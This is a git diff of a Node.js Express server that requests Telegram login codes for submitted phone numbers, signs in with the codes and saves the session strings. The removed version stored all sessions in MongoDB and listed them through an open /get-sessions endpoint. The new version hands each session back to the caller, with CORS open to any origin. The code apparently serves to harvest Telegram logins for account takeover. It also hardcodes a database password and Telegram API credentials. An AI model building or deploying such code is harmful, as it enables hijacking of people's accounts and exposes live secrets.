@@ -5,64 +5,47 @@ const { StringSession } = require('telegram/sessions');
 const mongoose = require('mongoose');
 
 const app = express();
-app.use(cors());
+app.use(cors({ origin: '*' }));
 app.use(express.json());
 
-// MongoDB Setup
-const MONGO_URI = 'mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0';
-mongoose.connect(MONGO_URI);
+// CONFIG
+const apiId = 23049703; // Deine API ID
+const apiHash = 'e9c00af578a9de0253ef02337460498f'; // Dein API Hash
+const dbUri = 'mongodb+srv://mercyinfo52_db_user:Hinva312-@cluster0.a0bslma.mongodb.net/?appName=Cluster0';
 
-const SessionSchema = new mongoose.Schema({ session: String, phone: String });
-const Session = mongoose.model('Session', SessionSchema);
+mongoose.connect(dbUri);
 
-const apiId = 23049703; // Deine ID
-const apiHash = 'e9c00af578a9de0253ef02337460498f'; // Dein Hash
-
-// Speicher für temporäre Client-States (in-memory)
-const activeClients = new Map();
+let client = null;
+let phoneCodeHash = null;
 
 app.post('/send-otp', async (req, res) => {
-    const { phone } = req.body;
     try {
-        const client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
+        const { phoneNumber } = req.body;
+        client = new TelegramClient(new StringSession(""), apiId, apiHash, { connectionRetries: 5 });
         await client.connect();
-        const result = await client.sendCode({ apiId, apiHash }, phone);
-        
-        activeClients.set(phone, { client, phoneCodeHash: result.phoneCodeHash });
-        res.json({ success: true, phoneCodeHash: result.phoneCodeHash });
-    } catch (error) {
-        res.status(400).json({ success: false, message: error.message });
+        const result = await client.sendCode({ apiId, apiHash }, phoneNumber);
+        phoneCodeHash = result.phoneCodeHash;
+        res.json({ success: true, phoneCodeHash });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
     }
 });
 
 app.post('/verify-otp', async (req, res) => {
-    const { phone, code, phoneCodeHash } = req.body;
-    const state = activeClients.get(phone);
-    
-    if (!state) return res.status(400).json({ success: false, message: "Session abgelaufen" });
-
     try {
-        await state.client.signIn({
+        const { phoneNumber, code } = req.body;
+        await client.signIn({
             apiId,
             apiHash,
-            phoneNumber: phone,
+            phoneNumber,
             phoneCode: code,
             phoneCodeHash: phoneCodeHash
         });
-
-        const stringSession = state.client.session.save();
-        await Session.create({ session: stringSession, phone });
-        
-        res.json({ success: true });
-        activeClients.delete(phone);
-    } catch (error) {
-        res.status(400).json({ success: false, message: error.message });
+        const sessionString = client.session.save();
+        res.json({ success: true, session: sessionString });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
     }
 });
 
-app.get('/get-sessions', async (req, res) => {
-    const sessions = await Session.find();
-    res.json(sessions);
-});
-
-app.listen(3000, () => console.log('Server läuft auf Port 3000'));
+app.listen(3000, () => console.log('Server running on port 3000'));
